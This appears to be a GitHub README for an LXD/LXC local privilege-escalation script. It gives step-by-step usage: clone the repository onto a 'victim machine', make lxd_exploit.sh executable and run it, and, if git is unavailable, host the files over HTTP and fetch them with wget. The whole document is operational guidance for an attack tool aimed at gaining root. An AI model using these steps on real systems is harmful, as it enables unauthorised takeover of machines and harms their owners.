# LXD/LXC Local Privilege Escalation

This script allows to vertically escalate privilege on linux machines with current user in [lxd/lxc](https://linuxcontainers.org/lxd/) group.

## Usage

On victim machine clone the repository:
```
git clone https://github.com/lykan89/LXD-privilege-escalation.git
```

Running the exploit:
```
cd LXD-privilege-escalation
chmod +x lxd_exploit.sh
./lxd_exploit.sh
```

## Note:
> If the `git clone` doesn't work on victim machine, Clone the repository on the local machine and host the folder via HTTP and `wget` it.

## License
This script uses MIT License
